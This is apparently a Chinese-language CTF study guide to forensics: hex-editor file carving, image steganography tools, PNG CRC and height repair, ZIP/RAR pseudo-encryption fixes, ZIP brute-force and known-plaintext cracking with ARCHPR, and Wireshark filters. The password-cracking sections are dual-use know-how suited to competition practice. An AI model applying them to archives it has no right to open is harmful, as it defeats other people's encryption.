<h5 id="4、手动"><a href="#4、手动" class="headerlink" title="4、手动"></a>4、手动</h5><p>除了使用dd外，还可以手进行文件分离，将目标文件放到Notepad++中打开后是乱码这是正常的，点开里面的插件选择HEX-Editor插件将其转换成16进制，找出分离的16进制，复制出来，将文件格式改为zip</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531160514147.png" alt="image-20200531160514147"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531161047702.png" alt="image-20200531161047702"></p>
<h5 id="5、010Editor"><a href="#5、010Editor" class="headerlink" title="5、010Editor"></a>5、010Editor</h5><p>将16进制字符文件导入保存操作：</p>
<p>比如获得一个文件将其打开发现是16进制的，这就说明让其把16进制变成一个压缩包</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531164853335.png" alt="image-20200531164853335"></p>
<p>使用010 Editor导入这个文件其实在这就能看到他是一个Rar文件，这样我们就进行另存为将其存为Rar文件。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531165346523.png" alt="image-20200531165346523"></p>
<p>发现桌面已经确实存为了rar后缀的压缩包</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531170000062.png" alt="image-20200531170000062"></p>
<h4 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h4><h5 id="1、Linux下文件合并"><a href="#1、Linux下文件合并" class="headerlink" title="1、Linux下文件合并"></a>1、Linux下文件合并</h5><p>linux下，通常对文件名相似的文件要进行批量合并</p>
<p>格式：<code>cat 合并的文件 &gt; 输出的文件</code></p>
<p>这两种方法都可以，*代表了多个</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531170822455.png" alt="image-20200531170822455"></p>
<p>完整性检测：linux下计算文件md5</p>
<p>格式：md5sum 文件名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531171058683.png" alt="image-20200531171058683"></p>
<h5 id="2、Windows下的文件合并"><a href="#2、Windows下的文件合并" class="headerlink" title="2、Windows下的文件合并"></a>2、Windows下的文件合并</h5><p>Windows下，通常需要对文件名相似的文件进行批量合并</p>
<p>格式：copy /B 合并的文件输出的文件命令</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531171248575.png" alt="image-20200531171248575"></p>
<p>完整性检测：windows下计算文件md5：</p>
<p>格式：<code>certutil -hashfile 文件名 md5</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531171356277.png" alt="image-20200531171356277"></p>
<h4 id="文件内容隐写"><a href="#文件内容隐写" class="headerlink" title="文件内容隐写"></a>文件内容隐写</h4><p>文件内容隐写，就是直接将KEY以十六进制的形式卸载文件中，通常在文件的开头或结尾部分，<strong>分析时通常重点观察文件开头和结尾部分</strong>。如果在文件中间部分，通常<strong>搜索关键字KEY或者flag来查找隐藏内容（每个工具都有查找功能使用查找功能进行查找）。</strong></p>
<p>Windows下，搜索隐写的文件内容</p>
<h5 id="1、Winhex-010Eidtor"><a href="#1、Winhex-010Eidtor" class="headerlink" title="1、Winhex / 010Eidtor"></a>1、Winhex / 010Eidtor</h5><p>​    将要识别的文件拖入010Eidtor(十六进制)，查找具有关键字或明显与文件内容不和谐的部分，通常优先观察文件首部和尾部，搜索flag或key等关键字，最后拖动滚轮寻找。</p>
<h5 id="2、Notepad"><a href="#2、Notepad" class="headerlink" title="2、Notepad++"></a>2、Notepad++</h5><p>​    使用notepad++打开文件，查看文件头尾是否有含有关键字的字符串，搜索flag或key等关键字，最后拖动滚轮寻找。</p>
<p>另外通过安装插件HEX-Editor可以实现010Editor</p>
<h4 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h4><h5 id="图片隐写的一些常见隐写方法"><a href="#图片隐写的一些常见隐写方法" class="headerlink" title="图片隐写的一些常见隐写方法"></a>图片隐写的一些常见隐写方法</h5><ol>
<li>细微的颜色差别</li>
<li>GIF图多帧隐藏<ol>
<li>颜色通道隐藏</li>
<li>不同帧图信息隐藏</li>
<li>不同帧对比隐写</li>
</ol>
</li>
<li>EXIF信息隐藏</li>
<li>图片修复<ol>
<li>图片头修复</li>
<li>图片尾修复</li>
<li>CRC校验修复</li>
<li>长、宽、高度修复</li>
</ol>
</li>
<li>最低有效位LSB隐写</li>
<li>图片加密<ol>
<li>Stegdetect</li>
<li>outguess</li>
<li>Jphide</li>
<li>F5</li>
</ol>
</li>
</ol>
<h5 id="图片文件隐写"><a href="#图片文件隐写" class="headerlink" title="图片文件隐写"></a>图片文件隐写</h5><h5 id="1、firework"><a href="#1、firework" class="headerlink" title="1、firework"></a>1、firework</h5><p>使用winhex打开文件时会看到文件头部中包含firework的标识，通过 firework / <strong>ps</strong> 可以找到<strong>隐藏图片</strong>。</p>
<p>使用场景：查看隐写的图片文件</p>
<p>最底下是每一帧的图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531213025025.png" alt="image-20200531213025025"></p>
<h5 id="2、Exif"><a href="#2、Exif" class="headerlink" title="2、Exif"></a>2、Exif</h5><p>​    Exif按照JPEG的规格在JPEG中插入一些图像 / 数字相机的信息数据以及缩略图像，可以通过与JPEG兼容的互联网浏览器 / 图片浏览器 / 图像处理等一些软件来查看Exif格式的图像文件，就跟浏览器通常的JPEG图像文件一样。</p>
<p>图片右键属性，查看详细信息，在相关选项卡中查找flag信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601220121589.png" alt="image-20200601220121589"></p>
<h5 id="3、Stegsolve"><a href="#3、Stegsolve" class="headerlink" title="3、Stegsolve"></a>3、Stegsolve</h5><p>​    当两张jpg图片外观、大小、像素都基本相同时，可以考虑进行结合分析，即将两个文件的像素RGB值进行XOR、ADD、SUB等操作，看能否得到有用的信息，StegSolve可以方便的进行这些操作。</p>
<p>1、打开一张图片，点击analyse中的image combiner</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601085301270.png" alt="image-20200601085301270"></p>
<p>筛选有用的图片进行save保存，这里显示的二维码是错误的，黑白颜色相反，所以需要进行取反处理，直接在画图中选中二维码右键取反就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601085458522.png" alt="image-20200601085458522"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601205608572.png" alt="image-20200601205608572"></p>
<p>如果是二维码GIF的话会看到一直动，就可以使用Stegsolve工具将二维码没帧都给截取下来</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531215008490.png" alt="image-20200531215008490"></p>
<h4 id="图片文件隐写-LSB"><a href="#图片文件隐写-LSB" class="headerlink" title="图片文件隐写-LSB"></a>图片文件隐写-LSB</h4><h5 id="4、LSB-最低有效位-Least-Significant-Bit"><a href="#4、LSB-最低有效位-Least-Significant-Bit" class="headerlink" title="4、LSB(最低有效位 Least Significant Bit)"></a>4、LSB(最低有效位 Least Significant Bit)</h5><p>​    LSB替换隐写基本思想是用嵌入的秘密信息取代载体图像的最低比特位，原来的7个高位平面与替代秘密信息的最低位平面组合成隐藏信息的新图形。</p>
<ol>
<li>像素三原色（RGB）</li>
<li>通过修改像素中最低位的1bit来达到隐藏的效果</li>
<li>工具：stegsolve、zsteg、wbstego4、python脚本</li>
</ol>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601092142617.png" alt="image-20200601092142617"></p>
<h5 id="1、Stegsolve-jar工具"><a href="#1、Stegsolve-jar工具" class="headerlink" title="1、Stegsolve.jar工具"></a>1、Stegsolve.jar工具</h5><p>使用的时候这个是需要有顺序的，有可能是RGB有可能是GBR等等</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601092344186.png" alt="image-20200601092344186"></p>
<h5 id="2、zsteg工具"><a href="#2、zsteg工具" class="headerlink" title="2、zsteg工具"></a>2、zsteg工具</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601100325469.png" alt="image-20200601100325469"></p>
<h5 id="3、wbstego4"><a href="#3、wbstego4" class="headerlink" title="3、wbstego4"></a>3、wbstego4</h5><p>解密通过lsb加密的图片</p>
<p>这个不止针对图片的最低有效位，还可能针对PDF的或者其他一些文件格式的最低有效位。它针对图片的最低有效位一般是针对 <code>.bmp</code> 的图片</p>
<p>这是wbstego4支持的4中文件格式</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601104521983.png" alt="image-20200601104521983"></p>
<p>因为是bmp文件所以将jpg的文件可以使用画图等工具另存为bmp格式的文件，使用wbStego4进行选择打开。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601135421953.png" alt="image-20200601135421953"></p>
<p>文件解密后存放的另外一个位置，一直下一步就OK</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601135624879.png" alt="image-20200601135624879"></p>
<p>可以看到保存到了这样一 个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601135720851.png" alt="image-20200601135720851"></p>
<p>打开后是乱码，然后会发现其中有flag，这只是这个工具的使用方法，当然也可以不用这个工具，直接使用zsteg就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601135905546.png" alt="image-20200601135905546"></p>
<h5 id="4、python脚本"><a href="#4、python脚本" class="headerlink" title="4、python脚本"></a>4、python脚本</h5><p>将脚本放在kali中运行，将目标文件放在脚本同目录下，将脚本中的文件名修改为文件名，运行脚本即可。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601140821948.png" alt="image-20200601140821948"></p>
<p>如果不用脚本的话，需要将这个图片转为PNG格式使用Stegsolve查看图片的通道</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601141541276.png" alt="image-20200601141541276"></p>
<h5 id="5、TweakPNG"><a href="#5、TweakPNG" class="headerlink" title="5、TweakPNG"></a>5、TweakPNG</h5><p>​    TweakPNG是一款简单易用的PNG图像浏览工具，它允许查看和修改一些PNG图像文件的元信息存储。</p>
<p>使用场景：文件头正常却无法打开文件，利用TweakPNG修改CRC</p>
<p>例：</p>
<p>1、当PNG文件头正常但无法打开文件，可能是CRC校验出错，可以尝试通过TweakPNG打开PNG，会弹出校验错误的提示，这里显示CRC是fe1a5ab6，正确的是b0a7a9f1。打开010Editor搜索fe1a5ab6将其改为b0a7a9f1</p>
<p>例：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601144401788.png" alt="image-20200601144401788"></p>
<p>2、文件头正常却无法打开，利用TweakPNG修改CRC….</p>
<p>又是CRC没有错误，但是图片的高度或者宽度发生了错误，需要通过CRC计算出正确的高度或者宽度</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601144643501.png" alt="image-20200601144643501"></p>
<p>例：</p>
<p>使用tweakpng打开图片，查看crc</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601191302824.png" alt="image-20200601191302824"></p>
<p>使用010Editor打开查看16进制，然后看看CRC是否相等，如果不同，进行修改，可以看到CRC是不同的，然后进行修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601191522264.png" alt="image-20200601191522264"></p>
<p>可以直接替换将全部的cbd6df8a进行替换</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601191728411.png" alt="image-20200601191728411"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601191803366.png" alt="image-20200601191803366"></p>
<p>查看图片，发现并没有生效，所以判断不是CRC造成的，然后将crc改回原来的值。因为不是crc造成的，所以这样就要计算它的高度和宽度了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601191830369.png" alt="image-20200601191830369"></p>
<p>可以看到python计算出的宽度和高度和图片本身是不同的，所以将A4改为F4</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601193158635.png" alt="image-20200601193158635"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601193245304.png" alt="image-20200601193245304"></p>
<p>保存，再次进行查看图片。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601193325132.png" alt="image-20200601193325132"></p>
<h5 id="6、Bftools"><a href="#6、Bftools" class="headerlink" title="6、Bftools"></a>6、Bftools</h5><p>​    Bftools用于解密图片信息。</p>
<p>使用场景：在Windows的cmd下，对加密过的图片文件进行解密。</p>
<p>格式：</p>
<p>Btfools.exe decode braincopter 要解密的图片名称 -output 输出文件名</p>
<p>Bftools.exe run 上一步输出的文件。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601194534064.png" alt="image-20200601194534064"></p>
<p>ls 或者 dir 查看一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601194602784.png" alt="image-20200601194602784"></p>
<p>在使用bftools.exe run 123.png</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601194700834.png" alt="image-20200601194700834"></p>
<h5 id="7、SilentEye"><a href="#7、SilentEye" class="headerlink" title="7、SilentEye"></a>7、SilentEye</h5><p>​    silenteye是一款可以将文字或者文件隐藏到图片的解密工具</p>
<p>使用场景：windows下打开silentEye工具，对加密的图片进行解密</p>
<p>例：</p>
<p>1、使用silentEye程序打开目标图片，点击image —&gt; decode，点击decode，可以查看隐藏文件，点击保存即可</p>
<p>原始界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601195333388.png" alt="image-20200601195333388"></p>
<p>打开文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601195451150.png" alt="image-20200601195451150"></p>
<p>点击decode进行解密，再次点击decode会出现flag.txt，这是选择保存文件的目录，按照自己进行选择路径</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601195608474.png" alt="image-20200601195608474"></p>
<p>查看保存路径，成功生成flag文件，打开里面你也有flag值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601195807699.png" alt="image-20200601195807699"></p>
<h5 id="8-JPG图像加密"><a href="#8-JPG图像加密" class="headerlink" title="8.JPG图像加密"></a>8.JPG图像加密</h5><p>1）Stegdetect 工具探测加密方式</p>
<p>​    stegdetect程序主要分析JPEG文件。因此用stegdetect可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息。</p>
<p>stegdetect xxx.jpg</p>
<p>stegdetect -s 敏感度 xxx.jpgexi</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601202600053.png" alt="image-20200601202600053"></p>
<p>2）Jphide</p>
<p>​    Jphide是基于最低有效位LSB的JPEG格式图像隐写算法。</p>
<p>例：</p>
<p>​    Stegdetect提示jphide加密时，可以用Jphs工具进行解密，打开jphswin.exe，使用open jpeg打开图片，点击seek，输入密码和确认密码，在弹出文件框中选择要保存的解密文件位置即可，结果保存成txt文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601202612647.png" alt="image-20200601202612647"></p>
<p>3）Outguess</p>
<p>​    outguess一般用于解密文件信息</p>
<p>使用场景：stegdetect识别出来或者题目提示是outguess加密的图片</p>
<p>该工具需要编译使用：./configure &amp;&amp; make &amp;&amp; make install</p>
<p>格式：outguess -r 要解密的文件名   输出结果文件名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601202821052.png" alt="image-20200601202821052"></p>
<p>4）F5</p>
<p>​    F5一般一用解密文件信息</p>
<p>使用场景：stegdetect识别出来或者题目提示是F5加密的图片</p>
<p>进入F5-steganography_F5目录，将图片文件拷贝至该目录下，从CMD进入该目录</p>
<p>格式：java Exrtact 要解密的文件名 -p 密码</p>
<p>运行结束后，我们可以直接在目录下的output.txt中看到结果</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601203803422.png" alt="image-20200601203803422"></p>
<h5 id="9、二维码处理"><a href="#9、二维码处理" class="headerlink" title="9、二维码处理"></a>9、二维码处理</h5><p>1、使用二维码扫描工具CQR.exe打开图片，找到内容没买过字段</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601204834103.png" alt="image-20200601204834103"></p>
<p>2、如果二维码某个定位角被覆盖了，该工具有时候也可以自动识别，如果识别失败，需要使用PS或者画图工具将另外几个叫的定位符移动到相应的位置，补全二维码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200601204839721.png" alt="image-20200601204839721"></p>
<p>3、如果某个二维码的定位点中间是白色的，可能被反色了，使用画图工具吧颜色反色回来在扫描即可。</p>
<h4 id="压缩文件分析"><a href="#压缩文件分析" class="headerlink" title="压缩文件分析"></a>压缩文件分析</h4><h5 id="1、伪加密"><a href="#1、伪加密" class="headerlink" title="1、伪加密"></a>1、伪加密</h5><p>​    如果压缩文件时加密的，或文件头正常但解压缩错误，首先尝试文件是否为伪加密。zip文件是否加密是通过标识符来显示的，在每个文件的文件目录字段有以为专门表示了文件是否加密，将其设置为00表示改文件未加密，如果成功解压则表示文件为伪加密，如果解压出错说明文件为真加密。</p>
<p>使用场景：伪加密文件</p>
<p>操作方法：使用010Editor打开压缩文件，找到文件头第九第十个字符，将其修改为0000</p>
<p>1、使用010Editor打开文件搜索16进制504B0102，可以看到每个加密文件的文件头字段。</p>
<p>为什么是504B0102？    因为504B0102是文件头</p>
<p>从50开始数，第九第十个字符为加密字段将其改为0000.</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603141436078.png" alt="20200603141436078.png">志位后如报错消失且正常解压，说明是伪加密。使用010Editor打开RAR文件，找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603143127926.png" alt="image-20200603143127926"></p>
<h5 id="2、暴力破解"><a href="#2、暴力破解" class="headerlink" title="2、暴力破解"></a>2、暴力破解</h5><p>​    通常我们可以使用ARCHPR.exe工具来破解zip文件</p>
<p>使用场景：windows下加密过的zip文件</p>
<p>现在ARCHPR不支持高版本解密。选择 压缩包时会出现错误</p>
<p>​    1、攻击类型选择暴力破解，在范围位置根据提示选择暴力破解范围选项设置暴力破解包含的类型、开始于和结束于选项具体范围，如果没有定于则全范围暴力破解。点击打开选择要破解的文件，点击开始进行破解。建议使用1~9位的数字密码，以及系统自带的英文字典作为密码字典。</p>
<p>2、攻击类型选择掩码可以进行复杂的暴力破解，比如知道密码前三位是abc，后三位为数字，则在攻击类型选择掩码，再掩码处输入abc???，暴力范围选项选择所有数字，打开要破解的点击，点击破解。时???的部分会被我们选择的暴力破解范围中的字符代替。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603150609122.png" alt="image-20200603150609122"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603151244361.png" alt="image-20200603151244361"></p>
<h5 id="3、明文攻击"><a href="#3、明文攻击" class="headerlink" title="3、明文攻击"></a>3、明文攻击</h5><p>​    明文攻击指知道加密的ZIP中部分文件的明文内容，利用这些内容推测出秘钥并解密ZIP文件的攻击方法，相比于暴力破解，这种方法在破解密码较为复杂的压缩包时效率更高。</p>
<p>使用场景：<strong>已知加密的zip部分文件明文内容</strong></p>
<p>例：假设一个加密的压缩包中有两个文件readme.txt和flag.ext，其中flag.txt的内容使我们希望知道的内容，而我们拥有readme.txt的明文文件，使用上述两个文件即可进行明文攻击</p>
<p>操作：</p>
<p>1、将readme.txt的明文文件进行压缩，变成readme1.zip(即将明文文件不加密压缩后的文件)，加密的文件</p>
<p>选择要破解的文件，点击开始，破解成功后会获得密码。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603153301226.png" alt="image-20200603153301226"></p>
<p>有时不一定能破解出文件口令，但是能够找到加密秘钥等信息，可以直接将文件解密，点击确定保存解密后的文件即可。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603153936066.png" alt="image-20200603153936066"></p>
<p>使用该方法需要注意两个关键点：</p>
<p>1、有一个明文文件，压缩后CRC值与加密压缩包中的文件一致。</p>
<p>2、明文文件的压缩算法需要与加密压缩文件的压缩算法一致。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603154354537.png" alt="image-20200603154354537"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603155107348.png" alt="image-20200603155107348"></p>
<h5 id="RAR文件格式"><a href="#RAR文件格式" class="headerlink" title="RAR文件格式"></a>RAR文件格式</h5><p>有时候给出的RAR文件的头部各个字块会故意给错导致无法识别。</p>
<p>正常情况下是没有0x7A这个文件头的，所以这是错误的，那么我们就要修改0x7A将其改为74，0x74是文件头类型。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603155649565.png" alt="image-20200603155649565"></p>
<p>更改后显示了两个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603155926679.png" alt="image-20200603155926679"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603155757624.png" alt="image-20200603155757624"></p>
<h4 id="流量取证"><a href="#流量取证" class="headerlink" title="流量取证"></a>流量取证</h4><h5 id="流量包文件分析"><a href="#流量包文件分析" class="headerlink" title="流量包文件分析"></a>流量包文件分析</h5><p>CTF比赛中，流量包的取证分析时另一项重要的考察方向。</p>
<h6 id="通常比赛中会提供一个包含流量数据的PCAP文件，有时也会需要选手们先进行修复或重构传输文件后，在进行分析。"><a href="#通常比赛中会提供一个包含流量数据的PCAP文件，有时也会需要选手们先进行修复或重构传输文件后，在进行分析。" class="headerlink" title="通常比赛中会提供一个包含流量数据的PCAP文件，有时也会需要选手们先进行修复或重构传输文件后，在进行分析。"></a><em>通常比赛中会提供一个包含流量数据的PCAP文件，有时也会需要选手们先进行修复或重构传输文件后，在进行分析。</em></h6><ul>
<li>总体把握<ul>
<li>协议分级</li>
<li>端点统计</li>
</ul>
</li>
<li>过滤筛选<ul>
<li>过滤语法</li>
<li>Host，Protocol，contains，特征值</li>
</ul>
</li>
<li>发现异常<ul>
<li>特殊字符串</li>
<li>协议某字段</li>
<li>flag位于服务器中</li>
</ul>
</li>
<li>数据提取<ul>
<li>字符串取</li>
<li>文件提取</li>
</ul>
</li>
</ul>
<p>总体来说比赛中的流量分析可以概括一下三个方向</p>
<ul>
<li>流量包修复</li>
<li>协议分析</li>
<li>数据提取 、</li>
</ul>
<h5 id="Wireshark工具"><a href="#Wireshark工具" class="headerlink" title="Wireshark工具"></a>Wireshark工具</h5><p>使用Wireshark网络分析器进行流量分析</p>
<p>Wireshark的过滤器和过滤规则能够帮助我们迅速定位到要分析的报文。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603172317772.png" alt="image-20200603172317772"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603173254349.png" alt="image-20200603173254349"></p>
<h5 id="Wireshark过滤器"><a href="#Wireshark过滤器" class="headerlink" title="Wireshark过滤器"></a>Wireshark过滤器</h5><p>五元组</p>
<ul>
<li>源IP地址</li>
<li>源端口</li>
<li>目的IP地址</li>
<li>目的端口</li>
<li>传输层协议 </li>
</ul>
<p>利用Wireshark本身强大的报文过滤器，帮助我们筛选出想要的报文。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603173850984.png" alt="image-20200603173850984"></p>
<p>常用的过滤命令：</p>
<h5 id="1、过滤IP，如源IP或者目标x-x-x-x"><a href="#1、过滤IP，如源IP或者目标x-x-x-x" class="headerlink" title="1、过滤IP，如源IP或者目标x.x.x.x"></a>1、过滤IP，如源IP或者目标x.x.x.x</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src eq x.x.x.x or ip.dst eq x.x.x.x 或者 ip.addr eq x.x.x.x</span><br></pre></td></tr></table></figure>

<h5 id="2、过滤端口"><a href="#2、过滤端口" class="headerlink" title="2、过滤端口"></a>2、过滤端口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tcp.port eq 80 or udp.port eq 80</span><br><span class="line"></span><br><span class="line">tcp.dstport &#x3D;&#x3D; 80 只显示tcp协议的目标端口为80</span><br><span class="line"></span><br><span class="line">tcp.srcport &#x3D;&#x3D; 80 只显示tcp协议的源端口为80</span><br><span class="line"></span><br><span class="line">tcp.port &gt;&#x3D; 1 and tcp port &lt;&#x3D; 80</span><br></pre></td></tr></table></figure>

<h5 id="3、过滤协议"><a href="#3、过滤协议" class="headerlink" title="3、过滤协议"></a>3、过滤协议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp&#x2F;udp&#x2F;arp&#x2F;icmp&#x2F;http&#x2F;ftp&#x2F;dns&#x2F;ip......</span><br></pre></td></tr></table></figure>

<h5 id="4、过滤MAC"><a href="#4、过滤MAC" class="headerlink" title="4、过滤MAC"></a>4、过滤MAC</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eth.dst &#x3D;&#x3D; A0:00:00:04:C5:84过滤目标mac</span><br></pre></td></tr></table></figure>

<h5 id="5、包长度过滤"><a href="#5、包长度过滤" class="headerlink" title="5、包长度过滤"></a>5、包长度过滤</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upd.length &#x3D;&#x3D; 26 	这个长度是指udp本身固定长度8加上udp下面那块数据包之和。</span><br><span class="line"></span><br><span class="line">tcp.len &gt;&#x3D; 7 		指的是ip数据包（tcp下面那块数据），不包括tcp本身</span><br><span class="line"></span><br><span class="line">ip.len &#x3D;&#x3D; 94		除了以太网头固定长度14，其他都算是ip.len，即从ip本身到最后</span><br><span class="line"></span><br><span class="line">frame.len &#x3D;&#x3D; 119 	整个数据包长度，从eth开始到最后</span><br></pre></td></tr></table></figure>

<h5 id="6、Http模式过滤"><a href="#6、Http模式过滤" class="headerlink" title="6、Http模式过滤"></a>6、Http模式过滤</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http.request.method &#x3D;&#x3D; &quot;GET&quot;</span><br><span class="line"></span><br><span class="line">http.request.method &#x3D;&#x3D; &quot;POST&quot;</span><br><span class="line"></span><br><span class="line">http.request.uri &#x3D;&#x3D; &quot;&#x2F;img&#x2F;logo-edu.gif&quot;</span><br><span class="line"></span><br><span class="line">http contains &quot;GET&quot;</span><br><span class="line"></span><br><span class="line">http contains &quot;HTTP&#x2F;1.&quot;</span><br><span class="line"></span><br><span class="line">http.request.method &#x3D;&#x3D; &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;</span><br><span class="line"></span><br><span class="line">http contains &quot;flag&quot;</span><br><span class="line"></span><br><span class="line">http contains &quot;key&quot;</span><br><span class="line"></span><br><span class="line">tcp contains &quot;flag&quot;</span><br></pre></td></tr></table></figure>

<h5 id="WireShark协议分析"><a href="#WireShark协议分析" class="headerlink" title="WireShark协议分析"></a>WireShark协议分析</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200603191446662.png" alt="image-20200603191446662"></p>
<p>根据数据包特征进行筛选</p>
<p>比如查看数据包的时候，有的数据包有某种特征，比如有http(80)，就可以筛选出这种特征出来。</p>
<p>右键 —&gt; 作为过滤器应用 —&gt; 选中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200604075738364.png" alt="image-20200604075738364"></p>
<h5 id="WireShark-流汇聚"><a href="#WireShark-流汇聚" class="headerlink" title="WireShark 流汇聚"></a>WireShark 流汇聚</h5><p>​    在关注的http数据包或cp数据包中选择流汇聚，可以将<strong>HTTP流</strong>或<strong>TCP流</strong>汇聚或还原成数据，在弹出的框中可以看到数据内容。</p>
<p>flag值就有可能存在TCP / HTTP流中</p>
